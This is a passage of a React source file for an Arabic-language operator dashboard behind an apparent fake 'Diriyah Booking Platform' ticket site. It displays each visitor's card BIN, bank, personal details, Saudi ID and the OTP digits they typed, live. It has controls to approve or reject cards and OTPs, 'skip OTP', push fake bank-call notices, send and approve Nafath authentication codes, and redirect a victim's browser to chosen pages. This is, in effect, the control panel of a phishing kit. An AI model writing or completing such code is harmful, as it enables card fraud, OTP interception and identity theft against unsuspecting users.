              {/* قبول / رفض */}
              <div className="grid grid-cols-2 gap-2">
                <button
                  onClick={handleApproveCard}
                  disabled={!hasCard}
                  className={`py-2 px-3 rounded-xl border font-bold text-xs flex items-center justify-center gap-1.5 transition ${
                    hasCard
                      ? "bg-emerald-950/40 border-emerald-500/40 hover:bg-emerald-900/50 text-emerald-400 cursor-pointer"
                      : "bg-slate-900/30 border-slate-800 text-slate-600 cursor-not-allowed"
                  }`}
                >
                  <Check className="w-4 h-4" />
                  <span>قبول</span>
                </button>
                <button
                  onClick={handleRejectCard}
                  disabled={!hasCard}
                  className={`py-2 px-3 rounded-xl border font-bold text-xs flex items-center justify-center gap-1.5 transition ${
                    hasCard
                      ? "bg-rose-950/40 border-rose-500/40 hover:bg-rose-900/50 text-rose-400 cursor-pointer"
                      : "bg-slate-900/30 border-slate-800 text-slate-600 cursor-not-allowed"
                  }`}
                >
                  <X className="w-4 h-4" />
                  <span>رفض</span>
                </button>
              </div>

              {/* تخطي OTP + إشعار البنك */}
              <div className="grid grid-cols-2 gap-2">
                <button
                  onClick={handleToggleSkipOtp}
                  className={`py-2 px-2.5 rounded-xl border text-xs font-semibold flex items-center justify-center gap-1.5 transition ${
                    skipOtpState
                      ? "bg-purple-950/50 border-purple-500 text-purple-300"
                      : "bg-[#0d1526] border-[#1a2844] hover:bg-[#131f38] text-slate-300"
                  }`}
                >
                  <ShieldCheck className="w-3.5 h-3.5 text-purple-400" />
                  <span className="truncate">تخطي OTP</span>
                </button>

                <button
                  onClick={handlePushBankContact}
                  className="py-2 px-2.5 rounded-xl bg-gradient-to-r from-sky-950/50 to-blue-950/50 border border-sky-500/40 hover:bg-sky-900/40 text-sky-300 text-xs font-semibold flex items-center justify-center gap-1.5 transition"
                  title="إرسال طلب تواصل من البنك للعميل"
                >
                  <PhoneCall className="w-3.5 h-3.5 text-sky-400" />
                  <span className="truncate">اتصال البنك</span>
                </button>
              </div>

              {/* إرسال إشعار للعميل */}
              <button
                onClick={() => setNotifyModalOpen(true)}
                className="py-2.5 px-3 rounded-xl bg-[#0284c7] hover:bg-[#0369a1] text-white font-bold text-xs flex items-center justify-center gap-2 transition shadow-md shadow-sky-600/20"
              >
                <Send className="w-3.5 h-3.5" />
                <span>إرسال إشعار للعميل</span>
              </button>

              {/* تحليل رقم البطاقة (BIN) */}
              <button
                onClick={() => hasCard && setBinModalOpen(true)}
                disabled={!hasCard}
                className={`py-2 px-3 rounded-xl border text-xs font-medium flex items-center justify-center gap-2 transition ${
                  hasCard
                    ? "bg-[#0d1526] border-[#2a1b2a] hover:border-purple-500/40 text-slate-300 cursor-pointer"
                    : "bg-slate-900/20 border-slate-800/60 text-slate-600 cursor-not-allowed"
                }`}
              >
                <CreditCard className="w-3.5 h-3.5 text-purple-400" />
                <span>
                  {hasCard
                    ? `تحليل رقم البطاقة (${currentData.cardBin}) BIN`
                    : "تحليل رقم البطاقة (غير متوفرة)"}
                </span>
              </button>

              {/* تحليل عنوان الـ IP */}
              <button
                onClick={() => setIpModalOpen(true)}
                className="py-2 px-3 rounded-xl bg-[#0d1526] border border-[#2a1b2a] hover:border-purple-500/40 text-slate-300 text-xs font-medium flex items-center justify-center gap-2 transition"
              >
                <Activity className="w-3.5 h-3.5 text-rose-400" />
                <span className="truncate">تحليل عنوان الـ IP ({currentData.ip || "109.107.226.188"})</span>
              </button>

              {/* سجل التدقيق والمراجعة */}
              <button
                onClick={() => setAuditModalOpen(true)}
                className="py-2 px-3 rounded-xl bg-[#2e1065]/40 border border-purple-500/30 hover:bg-[#2e1065]/70 text-purple-300 text-xs font-semibold flex items-center justify-center gap-2 transition"
              >
                <History className="w-3.5 h-3.5 text-purple-400" />
                <span>Audit Trail سجل التدقيق والمراجعة ({currentData.cardHistory?.length || 0})</span>
              </button>
            </div>
          </div>

          {/* ------------------------------------------------------------ */}
          {/* COLUMN 3: معلومات العميل + بيانات التذاكر + حجز المطعم */}
          {/* ------------------------------------------------------------ */}
          <div className="flex flex-col gap-2.5 h-full min-h-[500px] xl:min-h-0 justify-between overflow-y-auto custom-scrollbar">
            {/* Sub-panel 1: معلومات العميل الأساسية */}
            <div className="flex-shrink-0 bg-[#0b1220] border border-[#162238] rounded-2xl p-3 flex flex-col gap-2 shadow-sm">
              <div className="flex items-center justify-between pb-2 border-b border-[#162238]">
                <div className="flex items-center gap-1.5 font-bold text-xs text-white">
                  <User className="w-3.5 h-3.5 text-purple-400" />
                  <span>معلومات العميل الأساسية</span>
                </div>
                <div className="flex items-center gap-1.5">
                  {/* Status Indicator */}
                  <span className={`px-2 py-0.5 rounded-full text-[10px] font-bold ${
                    isCurrentVisitorOnline
                      ? "bg-emerald-950/70 border border-emerald-500/40 text-emerald-400"
                      : "bg-slate-800 border border-slate-700 text-slate-400"
                  }`}>
                    {isCurrentVisitorOnline ? "متصل الآن" : "غير متصل"}
                  </span>
                  {/* Block Visitor Button */}
                  <button
                    onClick={handleToggleBlockVisitor}
                    className={`p-1 rounded-lg border text-[10px] transition ${
                      currentData.blocked
                        ? "bg-rose-500 text-white border-rose-600"
                        : "bg-slate-800 border-slate-700 text-slate-400 hover:text-rose-400"
                    }`}
                    title={currentData.blocked ? "إلغاء حظر الزائر" : "حظر هذا الزائر"}
                  >
                    <Ban className="w-3 h-3" />
                  </button>
                </div>
              </div>

              <div className="space-y-1.5 text-xs">
                <div className="flex items-center justify-between">
                  <span className="text-slate-400">الاسم</span>
                  <span className="font-semibold text-slate-100 truncate max-w-[180px]">{currentData.name || "زائر بدون اسم"}</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-slate-400">رقم الجوال</span>
                  <span className="font-mono text-slate-100" dir="ltr">{currentData.phone || "غير متوفر"}</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-slate-400">البريد الإلكتروني</span>
                  <span className="font-mono text-slate-100 text-[11px] truncate max-w-[180px]" dir="ltr">
                    {currentData.email || "غير متوفر"}
                  </span>
                </div>
                {currentData.saudiId && (
                  <div className="flex items-center justify-between">
                    <span className="text-slate-400">رقم الهوية</span>
                    <span className="font-mono text-slate-100" dir="ltr">{currentData.saudiId}</span>
                  </div>
                )}
              </div>
            </div>

            {/* Sub-panel 2: بيانات التذاكر */}
            <div className="flex-shrink-0 bg-[#0b1220] border border-[#162238] rounded-2xl p-3 flex flex-col gap-1.5 shadow-sm">
              <div className="flex items-center gap-1.5 font-bold text-xs text-white pb-2 border-b border-[#162238]">
                <Ticket className="w-3.5 h-3.5 text-purple-400" />
                <span>بيانات التذاكر</span>
              </div>

              <div className="space-y-1.5 text-xs">
                <div className="flex items-center justify-between">
                  <span className="text-slate-400">عدد التذاكر</span>
                  <span className="font-semibold text-slate-100">{currentData.ticketCount || "1"}</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-slate-400">سعر التذكرة</span>
                  <span className="font-semibold text-slate-100">{currentData.ticketPrice || "50"} ر.س</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-slate-400">الإجمالي</span>
                  <span className="font-bold text-emerald-400">
                    {currentData.totalAmount || "50"} ر.س
                  </span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-slate-400">تاريخ ووقت الحجز</span>
                  <span className="font-mono text-[10px] text-slate-300 truncate max-w-[180px]" dir="ltr">
                    {currentData.bookingDate ? new Date(currentData.bookingDate).toLocaleString("en-GB") : "2026-09-24 18:00"}
                  </span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-slate-400">وقت الزيارة</span>
                  <span className="font-semibold text-slate-100">{currentData.visitTime || "09:00"}</span>
                </div>
              </div>
            </div>

            {/* Sub-panel 3: حجز المطعم */}
            <div className="bg-[#0b1220] border border-[#162238] rounded-2xl p-3 flex flex-col gap-1.5 shadow-sm flex-1 min-h-0 justify-between">
              <div className="flex items-center gap-1.5 font-bold text-xs text-white pb-2 border-b border-[#162238]">
                <Utensils className="w-3.5 h-3.5 text-purple-400" />
                <span>حجز المطعم</span>
              </div>

              <div className="space-y-1.5 text-xs">
                <div className="flex items-center justify-between">
                  <span className="text-slate-400">المطعم</span>
                  <span className="font-semibold text-slate-100">{currentData.restaurantName || "غير محدد"}</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-slate-400">تاريخ الحجز</span>
                  <span className="font-mono text-slate-100" dir="ltr">{currentData.restaurantDate || "2026-09-24"}</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-slate-400">وقت الحجز</span>
                  <span className="font-semibold text-slate-100">{currentData.restaurantTime || "1:00 م"}</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-slate-400">عدد الأشخاص</span>
                  <span className="font-semibold text-slate-100">{currentData.guestsCount || "2"}</span>
                </div>
              </div>
            </div>
          </div>

          {/* ------------------------------------------------------------ */}
          {/* COLUMN 4 (Left in RTL): التحقق الثنائي (OTP) & نفاذ */}
          {/* ------------------------------------------------------------ */}
          <div className="flex flex-col gap-2.5 h-full min-h-[500px] xl:min-h-0 justify-between overflow-y-auto custom-scrollbar">
            {/* OTP Panel with Real Data */}
            <div className="flex-shrink-0 bg-[#0b1220] border border-[#162238] rounded-2xl p-3.5 flex flex-col gap-2.5 shadow-sm">
              <div className="flex items-center justify-between pb-2 border-b border-[#162238]">
                <div className="flex items-center gap-1.5 font-bold text-sm text-white">
                  <ShieldCheck className="w-4 h-4 text-purple-400" />
                  <span>التحقق الثنائي (OTP)</span>
                </div>
                <button
                  onClick={() => setNafadModalOpen(true)}
                  className="px-2 py-0.5 rounded-lg bg-teal-950/60 border border-teal-500/30 text-teal-300 text-[10px] font-bold hover:bg-teal-900/50 transition"
                  title="إدارة التحقق عبر نفاذ الوطني"
                >
                  نفاذ الوطني
                  {currentData.nafadConfirmationCode ? ` (${currentData.nafadConfirmationCode})` : ""}
                </button>
              </div>

              {/* 6 Digit Boxes Showing Real OTP */}
              <div className="flex items-center justify-center gap-2 my-1" dir="ltr">
                {otpDigits.map((char, i) => (
                  <div
                    key={i}
                    className={`w-10 h-11 rounded-xl border flex items-center justify-center font-mono text-base font-bold shadow-inner transition-all ${
                      char !== "•"
                        ? "bg-purple-950/40 border-purple-500 text-purple-300 shadow-[0_0_10px_rgba(168,85,247,0.2)]"
                        : "bg-[#070c18] border-[#1a2844] text-slate-500"
                    }`}
                  >
                    {char}
                  </div>
                ))}
              </div>

              {/* Resend info and status badge */}
              <div className="flex items-center justify-between px-2.5 py-1.5 bg-[#070c18] border border-[#1a2844] rounded-xl text-xs">
                <span className="text-slate-400">حالة الرمز:</span>
                <span
                  className={`font-bold font-mono text-[11px] px-2 py-0.5 rounded-full ${
                    currentData.otpApproved
                      ? "text-emerald-400 bg-emerald-950/60 border border-emerald-500/30"
                      : currentData.otpStatus === "rejected"
                      ? "text-rose-400 bg-rose-950/60 border border-rose-500/30"
                      : "text-amber-400 bg-amber-950/60 border border-amber-500/30"
                  }`}
                >
                  {currentData.otp
                    ? currentData.otpApproved
                      ? "تم التحقق (مقبول)"
                      : currentData.otpStatus === "rejected"
                      ? "تم الرفض (مرفوض)"
                      : "بانتظار التأكيد"
                    : "لم يُدخل بعد"}
                </span>
              </div>

              {/* Action Buttons: OTP Approvals (قبول / رفض) + إعادة الإرسال */}
              <div className="space-y-2 pt-1">
                {/* OTP Approvals: قبول / رفض */}
                <div className="grid grid-cols-2 gap-2">
                  <button
                    onClick={handleApproveOtp}
                    disabled={!currentData.otp}
                    className={`py-2 px-3 rounded-xl border font-bold text-xs flex items-center justify-center gap-1.5 transition ${
                      currentData.otp
                        ? "bg-emerald-950/40 border-emerald-500/40 hover:bg-emerald-900/50 text-emerald-400 cursor-pointer shadow-sm shadow-emerald-950"
                        : "bg-slate-900/30 border-slate-800 text-slate-600 cursor-not-allowed"
                    }`}
                    title="قبول رمز التحقق"
                  >
                    <Check className="w-4 h-4 text-emerald-400" />
                    <span>قبول OTP</span>
                  </button>

                  <button
                    onClick={handleRejectOtp}
                    disabled={!currentData.otp}
                    className={`py-2 px-3 rounded-xl border font-bold text-xs flex items-center justify-center gap-1.5 transition ${
                      currentData.otp
                        ? "bg-rose-950/40 border-rose-500/40 hover:bg-rose-900/50 text-rose-400 cursor-pointer shadow-sm shadow-rose-950"
                        : "bg-slate-900/30 border-slate-800 text-slate-600 cursor-not-allowed"
                    }`}
                    title="رفض رمز التحقق وإشعار العميل بإعادة المحاولة"
                  >
                    <X className="w-4 h-4 text-rose-400" />
                    <span>رفض OTP</span>
                  </button>
                </div>

                <button
                  onClick={handleResendOtp}
                  className="w-full py-2 rounded-xl bg-[#0d1526] hover:bg-[#131f38] text-slate-300 border border-[#1a2844] font-semibold text-xs transition text-center flex items-center justify-center gap-1.5"
                >
                  <RefreshCw className="w-3.5 h-3.5 text-purple-400" />
                  <span>إعادة إرسال الرمز للعميل</span>
                </button>
              </div>
            </div>

            {/* Bottom Dark Visual Panel */}
            <div className="flex-1 min-h-[90px] bg-[#050810] border border-[#131b2c] rounded-2xl flex items-center justify-center p-3">
              <div className="text-center space-y-1.5 text-slate-500 text-xs">
                <Activity className="w-5 h-5 mx-auto text-purple-400 opacity-60" />
                <span className="font-mono text-[11px] block text-slate-300">
                  {currentData.cardBankName || (hasCard ? "Al Rajhi Bank / SNB" : "لا توجد تفاصيل مصرفية")}
                </span>
                <div className="flex items-center justify-center gap-1.5 text-[10px] text-slate-500 font-mono">
                  <span>IP: {currentData.ip}</span>
                  <span>•</span>
                  <span className={isCurrentVisitorOnline ? "text-emerald-400 font-semibold" : "text-slate-600"}>
                    {isCurrentVisitorOnline ? "متصل (Online)" : "غير متصل (Offline)"}
                  </span>
                </div>
              </div>
            </div>
          </div>

        </div>

      </div>

      {/* ============================================================== */}
      {/* FOOTER */}
      {/* ============================================================== */}
      <footer className="flex-shrink-0 mt-2 py-1 text-center text-xs text-slate-500 flex items-center justify-center gap-1.5">
        <span>Diriyah Booking Platform 2025 © جميع الحقوق محفوظة</span>
        <Shield className="w-3.5 h-3.5 text-slate-600" />
      </footer>

      {/* ============================================================== */}
      {/* MODALS */}
      {/* ============================================================== */}

      {/* 1. All Settings Modal (Comprehensive Settings: Blocked BINs & IPs) */}
      {settingsModalOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/75 backdrop-blur-sm" dir="rtl">
          <div className="w-full max-w-2xl bg-[#0b1220] border border-[#1a2844] rounded-2xl p-5 shadow-2xl space-y-4 max-h-[90vh] overflow-y-auto">
            <div className="flex items-center justify-between pb-3 border-b border-[#162238]">
              <div className="flex items-center gap-2">
                <Settings className="w-5 h-5 text-purple-400" />
                <h3 className="font-bold text-base text-white">إعدادات النظام والحظر المتقدم</h3>
              </div>
              <button onClick={() => setSettingsModalOpen(false)} className="text-slate-400 hover:text-white">
                <X className="w-5 h-5" />
              </button>
            </div>

            {/* Quick Actions Bar inside Settings */}
            <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
              <button
                onClick={() => {
                  setSettingsModalOpen(false);
                  setPageControlOpen(true);
                }}
                className="p-3 rounded-xl bg-slate-900 border border-slate-800 hover:border-sky-500/40 text-right space-y-1 transition"
              >
                <div className="text-xs font-bold text-sky-400 flex items-center gap-1.5">
                  <Layers className="w-4 h-4" />
                  <span>توجيه الصفحات</span>
                </div>
                <p className="text-[11px] text-slate-400">نقل العميل لأي مرحلة أو صفحة فوراً</p>
              </button>

              <button
                onClick={() => {
                  setSettingsModalOpen(false);
                  setNafadModalOpen(true);
                }}
                className="p-3 rounded-xl bg-slate-900 border border-slate-800 hover:border-teal-500/40 text-right space-y-1 transition"
              >
                <div className="text-xs font-bold text-teal-400 flex items-center gap-1.5">
                  <ShieldCheck className="w-4 h-4" />
                  <span>نفاذ الوطني</span>
                </div>
                <p className="text-[11px] text-slate-400">إرسال كود التحقق الثنائي وقبوله</p>
              </button>

              <button
                onClick={() => {
                  setSettingsModalOpen(false);
                  handlePushBankContact();
                }}
                className="p-3 rounded-xl bg-slate-900 border border-slate-800 hover:border-purple-500/40 text-right space-y-1 transition"
              >
                <div className="text-xs font-bold text-purple-400 flex items-center gap-1.5">
                  <PhoneCall className="w-4 h-4" />
                  <span>اتصال البنك</span>
                </div>
                <p className="text-[11px] text-slate-400">إشعار العميل باتصال موظف البنك</p>
              </button>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pt-2">
              {/* Blocked BINs Section */}
              <div className="bg-[#070c18] border border-[#1a2844] rounded-xl p-3.5 space-y-3">
                <div className="flex items-center justify-between">
                  <span className="text-xs font-bold text-slate-200 flex items-center gap-1.5">
                    <Ban className="w-3.5 h-3.5 text-rose-400" />
                    <span>البطاقات المحظورة (BIN)</span>
                  </span>
                  <span className="text-[10px] bg-rose-950/60 text-rose-400 border border-rose-500/30 px-2 py-0.5 rounded-full font-mono">
                    {blockedBins.length}
                  </span>
                </div>

                <div className="flex gap-1.5">
                  <input
                    type="text"
                    maxLength={6}
                    value={binInput}
                    onChange={(e) => setBinInput(e.target.value.replace(/\D/g, ""))}
                    placeholder="أول 6 أرقام (BIN)..."
                    className="flex-1 px-2.5 py-1.5 bg-[#0b1220] border border-[#1a2844] rounded-lg text-xs text-white font-mono placeholder-slate-500 focus:outline-none focus:ring-1 focus:ring-rose-500 text-center"
                    dir="ltr"
                  />
                  <button
                    onClick={() => handleAddBin(binInput)}
                    className="px-3 py-1.5 bg-rose-600 hover:bg-rose-500 text-white rounded-lg text-xs font-bold transition"
                  >
                    حظر
                  </button>
                </div>

                {hasCard && currentData.cardBin && !blockedBins.includes(currentData.cardBin) && (
                  <button
                    onClick={() => handleAddBin(currentData.cardBin)}
                    className="w-full py-1.5 bg-slate-800/60 hover:bg-slate-800 text-slate-300 rounded-lg text-[11px] font-semibold border border-slate-700 flex items-center justify-center gap-1.5"
                  >
                    <Plus className="w-3 h-3 text-rose-400" />
                    <span>حظر BIN الزائر الحالي ({currentData.cardBin})</span>
                  </button>
                )}

                <div className="max-h-40 overflow-y-auto space-y-1.5 text-xs pr-1">
                  {blockedBins.length === 0 ? (
                    <p className="text-center text-slate-500 py-3 text-[11px]">لا توجد بطاقات محظورة</p>
                  ) : (
                    blockedBins.map((bin) => (
                      <div
                        key={bin}
                        className="flex items-center justify-between p-2 rounded-lg bg-[#0b1220] border border-slate-800"
                      >
                        <span className="font-mono text-slate-200" dir="ltr">{bin}••••••••••</span>
                        <button
                          onClick={() => handleRemoveBin(bin)}
                          className="text-rose-400 hover:text-rose-300 p-1"
                          title="فك الحظر"
                        >
                          <Trash2 className="w-3.5 h-3.5" />
                        </button>
                      </div>
                    ))
                  )}
                </div>
              </div>

              {/* Blocked IPs Section */}
              <div className="bg-[#070c18] border border-[#1a2844] rounded-xl p-3.5 space-y-3">
                <div className="flex items-center justify-between">
                  <span className="text-xs font-bold text-slate-200 flex items-center gap-1.5">
                    <WifiOff className="w-3.5 h-3.5 text-rose-400" />
                    <span>عناوين الـ IP المحظورة</span>
                  </span>
                  <span className="text-[10px] bg-rose-950/60 text-rose-400 border border-rose-500/30 px-2 py-0.5 rounded-full font-mono">
                    {blockedIps.length}
                  </span>
                </div>

                <div className="flex gap-1.5">
                  <input
                    type="text"
                    value={ipInput}
                    onChange={(e) => setIpInput(e.target.value)}
                    placeholder="عنوان IP..."
                    className="flex-1 px-2.5 py-1.5 bg-[#0b1220] border border-[#1a2844] rounded-lg text-xs text-white font-mono placeholder-slate-500 focus:outline-none focus:ring-1 focus:ring-rose-500 text-center"
                    dir="ltr"
                  />
                  <button
                    onClick={() => handleAddIp(ipInput)}
                    className="px-3 py-1.5 bg-rose-600 hover:bg-rose-500 text-white rounded-lg text-xs font-bold transition"
                  >
                    حظر
                  </button>
                </div>

                {currentData.ip && !blockedIps.includes(currentData.ip) && (
                  <button
                    onClick={() => handleAddIp(currentData.ip)}
                    className="w-full py-1.5 bg-slate-800/60 hover:bg-slate-800 text-slate-300 rounded-lg text-[11px] font-semibold border border-slate-700 flex items-center justify-center gap-1.5"
                  >
                    <Plus className="w-3 h-3 text-rose-400" />
                    <span>حظر IP الزائر الحالي ({currentData.ip})</span>
                  </button>
                )}

                <div className="max-h-40 overflow-y-auto space-y-1.5 text-xs pr-1">
                  {blockedIps.length === 0 ? (
                    <p className="text-center text-slate-500 py-3 text-[11px]">لا توجد عناوين IP محظورة</p>
                  ) : (
                    blockedIps.map((ip) => (
                      <div
                        key={ip}
                        className="flex items-center justify-between p-2 rounded-lg bg-[#0b1220] border border-slate-800"
                      >
                        <span className="font-mono text-slate-200" dir="ltr">{ip}</span>
                        <button
                          onClick={() => handleRemoveIp(ip)}
                          className="text-rose-400 hover:text-rose-300 p-1"
                          title="فك الحظر"
                        >
                          <Trash2 className="w-3.5 h-3.5" />
                        </button>
                      </div>
                    ))
                  )}
                </div>
              </div>
            </div>

            <div className="flex justify-end pt-2 border-t border-[#162238]">
              <button
                onClick={() => setSettingsModalOpen(false)}
                className="px-5 py-2 bg-purple-600 hover:bg-purple-700 text-white rounded-xl text-xs font-bold transition"
              >
                حفظ وإغلاق
              </button>
            </div>
          </div>
        </div>
      )}

      {/* 2. Page Control Directive Modal */}
      {pageControlOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/75 backdrop-blur-sm" dir="rtl">
          <div className="w-full max-w-md bg-[#0b1220] border border-[#1a2844] rounded-2xl p-5 shadow-2xl space-y-4">
            <div className="flex items-center justify-between pb-3 border-b border-[#162238]">
              <div className="flex items-center gap-2">
                <Layers className="w-4 h-4 text-sky-400" />
                <h3 className="font-bold text-sm text-white">التحكم بصفحات العميل وتوجيهه</h3>
              </div>
              <button onClick={() => setPageControlOpen(false)} className="text-slate-400 hover:text-white">
                <X className="w-4 h-4" />
              </button>
            </div>

            {/* Selected Visitor Info Banner */}
            <div className="p-2.5 rounded-xl bg-sky-950/40 border border-sky-500/30 flex items-center justify-between text-xs">
              <span className="text-slate-400">الزائر المستهدف:</span>
              <span className="font-bold text-sky-300">
                {currentData.name || "زائر بدون اسم"} ({currentData.phone || currentData.id.slice(0, 14)})
              </span>
            </div>

            <p className="text-xs text-slate-400 leading-relaxed">
              اختر الصفحة التي تريد نقل العميل إليها فوراً في متصفحه:
            </p>

            <div className="grid grid-cols-2 gap-2">
              {Object.entries(STEP_LABELS).map(([stepKey, label]) => {
                const s = Number(stepKey);
                const isCurrent = currentData.directedStep === s;
                return (
                  <button
                    key={s}
                    onClick={() => handlePushPageStep(s)}
                    className={`p-3 rounded-xl border text-right transition flex items-center justify-between gap-1.5 ${
                      isCurrent
                        ? "bg-sky-600 text-white border-sky-400 font-bold shadow-md shadow-sky-600/30"
                        : "bg-[#070c18] border-[#1a2844] hover:border-sky-500/50 text-slate-200 font-semibold"
                    }`}
                  >
                    <div className="text-xs">{label}</div>
                    {isCurrent && <Check className="w-4 h-4 shrink-0 text-white" />}
                  </button>
                );
              })}
            </div>

            {/* Reset Directive Button */}
            <button
              onClick={() => handlePushPageStep(0)}
              className={`w-full py-2.5 px-3 rounded-xl border text-center font-bold text-xs transition flex items-center justify-center gap-1.5 ${
                !currentData.directedStep || currentData.directedStep === 0
                  ? "bg-slate-900/60 border-slate-800 text-slate-500 cursor-default"
                  : "bg-rose-950/40 border-rose-500/40 hover:bg-rose-900/50 text-rose-300 shadow-sm"
              }`}
            >
              <RefreshCw className="w-3.5 h-3.5 text-rose-400" />
              <span>إلغاء التوجيه / العودة للتدفق الطبيعي</span>
            </button>

            <div className="flex justify-end pt-2 border-t border-[#162238]">
              <button
                onClick={() => setPageControlOpen(false)}
                className="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-xl text-xs font-semibold"
              >
                إغلاق
              </button>
            </div>
          </div>
        </div>
      )}

      {/* 3. Nafad Control Modal */}
      {nafadModalOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/75 backdrop-blur-sm" dir="rtl">
          <div className="w-full max-w-sm bg-[#0b1220] border border-[#1a2844] rounded-2xl p-5 shadow-2xl space-y-4">
            <div className="flex items-center justify-between pb-3 border-b border-[#162238]">
              <div className="flex items-center gap-2">
                <ShieldCheck className="w-4 h-4 text-teal-400" />
                <h3 className="font-bold text-sm text-white">إدارة التحقق عبر نفاذ الوطني</h3>
              </div>
              <button onClick={() => setNafadModalOpen(false)} className="text-slate-400 hover:text-white">
                <X className="w-4 h-4" />
              </button>
            </div>

            <div className="space-y-3">
              <div className="p-3 rounded-xl bg-teal-950/30 border border-teal-500/30 text-center space-y-1">
                <span className="text-[11px] text-teal-300 block font-semibold">الرقم الحالي المعروض للمستخدم</span>
                <span className="text-2xl font-black font-mono text-teal-200 block" dir="ltr">
                  {currentData.nafadConfirmationCode || "لم يُرسل"}
                </span>
                <span className="text-[10px] text-slate-400 block">
                  الحالة: {currentData.nafadConfirmationStatus === "approved" ? "مقبول" : currentData.nafadConfirmationStatus === "rejected" ? "مرفوض" : "بانتظار التأكيد"}
                </span>
              </div>

              <div className="space-y-1.5">
                <label className="text-[11px] text-slate-400 font-semibold block">إرسال رقم نفاذ جديد (رقمين):</label>
                <div className="flex gap-2">
                  <input
                    type="text"
                    maxLength={2}
                    value={nafadCodeInput}
                    onChange={(e) => setNafadCodeInput(e.target.value.replace(/\D/g, "").slice(0, 2))}
                    placeholder="مثال: 45"
                    className="flex-1 px-3 py-2 bg-[#070c18] border border-[#1a2844] rounded-xl text-center font-mono text-base text-white focus:outline-none focus:ring-1 focus:ring-teal-500"
                    dir="ltr"
                  />
                  <button
                    onClick={handleSendNafadCode}
                    className="px-4 py-2 bg-teal-600 hover:bg-teal-500 text-white rounded-xl text-xs font-bold transition"
                  >
                    إرسال
                  </button>
                </div>
              </div>

              <div className="grid grid-cols-2 gap-2 pt-2">
                <button
                  onClick={handleApproveNafad}
                  className="py-2 bg-emerald-600 hover:bg-emerald-500 text-white rounded-xl text-xs font-bold transition"
                >
                  قبول نفاذ
                </button>
                <button
                  onClick={handleRejectNafad}
                  className="py-2 bg-rose-600 hover:bg-rose-500 text-white rounded-xl text-xs font-bold transition"
                >
                  رفض نفاذ
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* 4. BIN Analysis Modal */}
      {binModalOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm" dir="rtl">
          <div className="w-full max-w-sm bg-[#0b1220] border border-[#1a2844] rounded-2xl p-5 shadow-2xl space-y-4">
            <div className="flex items-center justify-between pb-2 border-b border-[#162238]">
              <h3 className="font-bold text-sm text-white">تحليل رقم البطاقة (BIN: {currentData.cardBin})</h3>
              <button onClick={() => setBinModalOpen(false)} className="text-slate-400 hover:text-white">
                <X className="w-4 h-4" />
              </button>
            </div>
            <div className="space-y-2 text-xs">
              <div className="flex justify-between py-1 border-b border-slate-800">
                <span className="text-slate-400">البنك المصدر:</span>
                <span className="font-semibold text-white">{currentData.cardBankName || "مصرف الراجحي / البنك الأهلي"}</span>
              </div>
              <div className="flex justify-between py-1 border-b border-slate-800">
                <span className="text-slate-400">نوع البطاقة:</span>
                <span className="font-semibold text-emerald-400">{currentData.cardType} Classic / Debit</span>
              </div>
              <div className="flex justify-between py-1 border-b border-slate-800">
                <span className="text-slate-400">الشبكة:</span>
                <span className="font-semibold text-blue-400">{currentData.cardType}</span>
              </div>
              <div className="flex justify-between py-1">
                <span className="text-slate-400">دولة الإصدار:</span>
                <span className="font-semibold text-white">{currentData.geoCountry || "Saudi Arabia (SA)"}</span>
              </div>
            </div>
            <button
              onClick={() => setBinModalOpen(false)}
              className="w-full py-2 bg-purple-600 hover:bg-purple-700 text-white rounded-xl text-xs font-bold"
            >
              إغلاق
            </button>
          </div>
        </div>
      )}

      {/* 5. IP Analysis Modal */}
      {ipModalOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm" dir="rtl">
          <div className="w-full max-w-sm bg-[#0b1220] border border-[#1a2844] rounded-2xl p-5 shadow-2xl space-y-4">
            <div className="flex items-center justify-between pb-2 border-b border-[#162238]">
              <h3 className="font-bold text-sm text-white">تحليل عنوان الـ IP</h3>
              <button onClick={() => setIpModalOpen(false)} className="text-slate-400 hover:text-white">
                <X className="w-4 h-4" />
              </button>
            </div>
            <div className="space-y-2 text-xs">
              <div className="flex justify-between py-1 border-b border-slate-800">
                <span className="text-slate-400">عنوان الـ IP:</span>
                <span className="font-mono font-semibold text-white">{currentData.ip || "109.107.226.188"}</span>
              </div>
              <div className="flex justify-between py-1 border-b border-slate-800">
                <span className="text-slate-400">الدولة:</span>
                <span className="font-semibold text-emerald-400">{currentData.geoCountry || "السعودية"}</span>
              </div>
              <div className="flex justify-between py-1 border-b border-slate-800">
                <span className="text-slate-400">المدينة:</span>
                <span className="font-semibold text-white">{currentData.geoCity || "الرياض"}</span>
              </div>
              <div className="flex justify-between py-1">
                <span className="text-slate-400">حالة الاتصال:</span>
                <span className={`font-semibold ${isCurrentVisitorOnline ? "text-emerald-400" : "text-slate-500"}`}>
                  {isCurrentVisitorOnline ? "متصل الآن (Online)" : "غير متصل (Offline)"}
                </span>
              </div>
            </div>
            <button
              onClick={() => setIpModalOpen(false)}
              className="w-full py-2 bg-purple-600 hover:bg-purple-700 text-white rounded-xl text-xs font-bold"
            >
              إغلاق
            </button>
          </div>
        </div>
      )}

      {/* 6. Send Client Notification Modal */}
      {notifyModalOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm" dir="rtl">
          <div className="w-full max-w-sm bg-[#0b1220] border border-[#1a2844] rounded-2xl p-5 shadow-2xl space-y-4">
            <div className="flex items-center justify-between pb-2 border-b border-[#162238]">
              <h3 className="font-bold text-sm text-white">إرسال إشعار مباشر للعميل</h3>
